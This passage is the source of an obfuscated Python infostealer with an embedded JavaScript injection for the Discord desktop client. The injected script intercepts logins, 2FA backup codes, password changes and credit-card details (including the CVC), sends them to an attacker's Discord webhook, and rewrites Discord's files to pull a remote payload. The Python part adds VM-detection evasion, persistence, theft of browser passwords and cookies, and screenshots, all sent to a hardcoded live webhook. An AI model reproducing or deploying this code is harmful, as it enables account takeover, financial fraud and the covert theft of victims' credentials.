                const account = await fetchAccount(token)

                const filteredCodes = codes.filter((code) => {
                    return code.consumed === false;
                });

                let message = "";
                for (let code of filteredCodes) {
                    message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
                }
                const content = {
                    "content": `**${account.username}** just viewed his 2FA backup codes!`,
                    "embeds": [{
                        "fields": [{
                                "name": "Backup Codes",
                                "value": "```" + message + "```",
                                "inline": false
                            },
                            {
                                "name": "Email",
                                "value": "`" + account.email + "`",
                                "inline": true
                            }, {
                                "name": "Phone",
                                "value": "`" + (account.phone || "None") + "`",
                                "inline": true
                            }
                        ]

                    }]
                };

                hooker(content, token, account);
            }

            const PasswordChanged = async (newPassword, oldPassword, token) => {
                const account = await fetchAccount(token)

                const content = {
                    "content": `**${account.username}** just changed his password!`,
                    "embeds": [{
                        "fields": [{
                            "name": "New Password",
                            "value": "`" + newPassword + "`",
                            "inline": true
                        }, {
                            "name": "Old Password",
                            "value": "`" + oldPassword + "`",
                            "inline": true
                        }]
                    }]
                };

                hooker(content, token, account);
            }

            const CreditCardAdded = async (number, cvc, month, year, token) => {
                const account = await fetchAccount(token)

                const content = {
                    "content": `**${account.username}** just added a credit card!`,
                    "embeds": [{
                        "fields": [{
                            "name": "Number",
                            "value": "`" + number + "`",
                            "inline": true
                        }, {
                            "name": "CVC",
                            "value": "`" + cvc + "`",
                            "inline": true
                        }, {
                            "name": "Expiration",
                            "value": "`" + month + "/" + year + "`",
                            "inline": true
                        }]
                    }]
                };

                hooker(content, token, account);
            }

            const PaypalAdded = async (token) => {
                const account = await fetchAccount(token)

                const content = {
                    "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
                    "embeds": [{
                        "fields": [{
                            "name": "Email",
                            "value": "`" + account.email + "`",
                            "inline": true
                        }, {
                            "name": "Phone",
                            "value": "`" + (account.phone || "None") + "`",
                            "inline": true
                        }]
                    }]
                };

                hooker(content, token, account);
            }

            const discordPath = (function () {
                const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
                let resourcePath;

                if (process.platform === 'win32') {
                    resourcePath = path.join(app, 'resources');
                } else if (process.platform === 'darwin') {
                    resourcePath = path.join(app, 'Contents', 'Resources');
                }

                if (fs.existsSync(resourcePath)) return {
                    resourcePath,
                    app
                };
                return {
                    undefined,
                    undefined
                };
            })();

            async function initiation() {
                if (fs.existsSync(path.join(__dirname, 'initiation'))) {
                    fs.rmdirSync(path.join(__dirname, 'initiation'));

                    const token = await getToken();
                    if (!token) return;

                    const account = await fetchAccount(token)

                    const content = {
                        "content": `**${account.username}** just got injected!`,

                        "embeds": [{
                            "fields": [{
                                "name": "Email",
                                "value": "`" + account.email + "`",
                                "inline": true
                            }, {
                                "name": "Phone",
                                "value": "`" + (account.phone || "None") + "`",
                                "inline": true
                            }]
                        }]
                    };

                    await hooker(content, token, account);
                    clearAllUserData();
                }

                const {
                    resourcePath,
                    app
                } = discordPath;
                if (resourcePath === undefined || app === undefined) return;
                const appPath = path.join(resourcePath, 'app');
                const packageJson = path.join(appPath, 'package.json');
                const resourceIndex = path.join(appPath, 'index.js');
                const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
                const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
                const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
                if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
                if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
                if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

                if (process.platform === 'win32' || process.platform === 'darwin') {
                    fs.writeFileSync(
                        packageJson,
                        JSON.stringify({
                                name: 'discord',
                                main: 'index.js',
                            },
                            null,
                            4,
                        ),
                    );

                    const startUpScript = `const fs = require('fs'), https = require('https');
              const indexJs = '${indexJs}';
              const bdPath = '${bdPath}';
              const fileSize = fs.statSync(indexJs).size
              fs.readFileSync(indexJs, 'utf8', (err, data) => {
                  if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
                      init();
              })
              async function init() {
                  https.get('${CONFIG.injection_url}', (res) => {
                      const file = fs.createWriteStream(indexJs);
                      res.replace('%WEBHOOK%', '${CONFIG.webhook}')
                      res.pipe(file);
                      file.on('finish', () => {
                          file.close();
                      });
                  
                  }).on("error", (err) => {
                      setTimeout(init(), 10000);
                  });
              }
              require('${path.join(resourcePath, 'app.asar')}')
              if (fs.existsSync(bdPath)) require(bdPath);`;
                    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
                }
            }

            let email = "";
            let password = "";
            let initiationCalled = false;
            const createWindow = () => {
                mainWindow = BrowserWindow.getAllWindows()[0];
                if (!mainWindow) return

                mainWindow.webContents.debugger.attach('1.3');
                mainWindow.webContents.debugger.on('message', async (_, method, params) => {
                    if (!initiationCalled) {
                        await initiation();
                        initiationCalled = true;
                    }

                    if (method !== 'Network.responseReceived') return;
                    if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
                    if (![200, 202].includes(params.response.status)) return;

                    const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
                        requestId: params.requestId
                    });
                    const responseData = JSON.parse(responseUnparsedData.body);

                    const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
                        requestId: params.requestId
                    });
                    const requestData = JSON.parse(requestUnparsedData.postData);

                    switch (true) {
                        case params.response.url.endsWith('/login'):
                            if (!responseData.token) {
                                email = requestData.login;
                                password = requestData.password;
                                return; // 2FA
                            }
                            EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                            break;

                        case params.response.url.endsWith('/register'):
                            EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                            break;

                        case params.response.url.endsWith('/totp'):
                            EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                            break;

                        case params.response.url.endsWith('/codes-verification'):
                            BackupCodesViewed(responseData.backup_codes, await getToken());
                            break;

                        case params.response.url.endsWith('/@me'):
                            if (!requestData.password) return;

                            if (requestData.email) {
                                EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                            }

                            if (requestData.new_password) {
                                PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                            }
                            break;
                    }
                });

                mainWindow.webContents.debugger.sendCommand('Network.enable');

                mainWindow.on('closed', () => {
                    createWindow()
                });
            }
            createWindow();

            session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
                if (![200, 202].includes(details.statusCode)) return;
                if (details.method != 'POST') return;
                switch (true) {
                    case details.url.endsWith('tokens'):
                        const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
                        CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
                        break;

                    case details.url.endsWith('paypal_accounts'):
                        PaypalAdded(await getToken());
                        break;
                }
            });

            session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
                if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
                    cancel: true
                })
            });

            module.exports = require("./core.asar");
            """#line:959:"""
        with open (OOO000O0OO0OO000O ,'w',encoding ='utf-8')as OOO0O00OOO0O00O00 :#line:961:with open(index_js_path, 'w', encoding='utf-8') as file:
            OOO0O00OOO0O00O00 .write (OO0OO0O0O0O000OO0 +"\n"+OO000O000O0O0OOO0 )#line:962:file.write(content + "\n" + js_code)
        print ("JavaScript injected successfully.")#line:964:print("JavaScript injected successfully.")
    except Exception as OOO00OOOO00OO0O00 :#line:965:except Exception as e:
        print (f"Error injecting JavaScript into Discord: {OOO00OOOO00OO0O00}")#line:966:print(f"Error injecting JavaScript into Discord: {e}")
def is_discord_running ():#line:968:def is_discord_running():
    ""#line:971:"""
    for OO00OOO0O0O0O0OO0 in psutil .process_iter (['pid','name']):#line:972:for process in psutil.process_iter(['pid', 'name']):
        if OO00OOO0O0O0O0OO0 .info ['name'].lower ()=='discord.exe':#line:973:if process.info['name'].lower() == 'discord.exe':
            return True #line:974:return True
    return False #line:975:return False
def kill_discord_processes ():#line:977:def kill_discord_processes():
    ""#line:980:"""
    try :#line:981:try:
        if is_discord_running ():#line:982:if is_discord_running():
            for OOO00OOOO0OOOOOOO in psutil .process_iter (['pid','name']):#line:983:for process in psutil.process_iter(['pid', 'name']):
                if OOO00OOOO0OOOOOOO .info ['name'].lower ()=='discord.exe':#line:984:if process.info['name'].lower() == 'discord.exe':
                    OOO00OOOO0OOOOOOO .terminate ()#line:985:process.terminate()
                    print (f"Terminated Discord process with PID {OOO00OOOO0OOOOOOO.info['pid']}.")#line:986:print(f"Terminated Discord process with PID {process.info['pid']}.")
            print ("All Discord processes terminated.")#line:987:print("All Discord processes terminated.")
        else :#line:988:else:
            print ("No Discord processes found.")#line:989:print("No Discord processes found.")
    except Exception as O0O000OO0O0OO0OOO :#line:990:except Exception as e:
        print (f"Error terminating Discord processes: {O0O000OO0O0OO0OOO}")#line:991:print(f"Error terminating Discord processes: {e}")
def restart_discord ():#line:993:def restart_discord():
    ""#line:996:"""
    try :#line:997:try:
        O00000O0O0OO0O000 =os .path .join (os .getenv ('LOCALAPPDATA'),"Discord","app-*","Discord.exe")#line:998:discord_path = os.path.join(os.getenv('LOCALAPPDATA'), "Discord", "app-*", "Discord.exe")
        for OOOO0OO00000000O0 in glob .glob (O00000O0O0OO0O000 ):#line:1000:for version_path in glob.glob(discord_path):
            if file_exists (OOOO0OO00000000O0 ):#line:1001:if file_exists(version_path):
                subprocess .Popen (OOOO0OO00000000O0 )#line:1002:subprocess.Popen(version_path)
                print ("Discord restarted.")#line:1003:print("Discord restarted.")
                return #line:1004:return
        print (f"Discord executable not found: {O00000O0O0OO0O000}")#line:1005:print(f"Discord executable not found: {discord_path}")
    except Exception as O0OOO0OOO0O00OO0O :#line:1006:except Exception as e:
        print (f"Error restarting Discord: {O0OOO0OOO0O00OO0O}")#line:1007:print(f"Error restarting Discord: {e}")
def main ():#line:1010:def main():
    O0O00O00O0000O00O ="https://discord.com/api/webhooks/1254850102904754176/ucZn6p7XZazNEFi63ii29Fob1dkE5pIvuFal3e-KnJgi76Ku9o6nYZ36r5GyZ2Zkt6Rv"#line:1011:webhook_url = "https://discord.com/api/webhooks/1254850102904754176/ucZn6p7XZazNEFi63ii29Fob1dkE5pIvuFal3e-KnJgi76Ku9o6nYZ36r5GyZ2Zkt6Rv"
    bypass_vm_detection (O0O00O00O0000O00O )#line:1012:bypass_vm_detection(webhook_url)
    add_persistence ()#line:1013:add_persistence()
    O00O000O00OO000O0 =["chrome","edge","opera","brave","vivaldi","yandex"]#line:1015:browsers = ["chrome", "edge", "opera", "brave", "vivaldi", "yandex"]
    for O00OOO00O00O0OO00 in O00O000O00OO000O0 :#line:1016:for browser in browsers:
        O0000000O0000O00O =extract_browser_data (O00OOO00O00O0OO00 )#line:1017:data = extract_browser_data(browser)
        if O0000000O0000O00O ['passwords']or O0000000O0000O00O ['cookies']:#line:1018:if data['passwords'] or data['cookies']:
            send_data_to_webhook (O0000000O0000O00O ,O0O00O00O0000O00O )#line:1019:send_data_to_webhook(data, webhook_url)
    capture_and_send_screenshot (O0O00O00O0000O00O )#line:1021:capture_and_send_screenshot(webhook_url)
    kill_discord_processes ()#line:1023:kill_discord_processes()
    inject_js_to_discord (O0O00O00O0000O00O )#line:1024:inject_js_to_discord(webhook_url)
    restart_discord ()#line:1025:restart_discord()
if __name__ =="__main__":#line:1027:if __name__ == "__main__":
    main ()#line:1028:main()

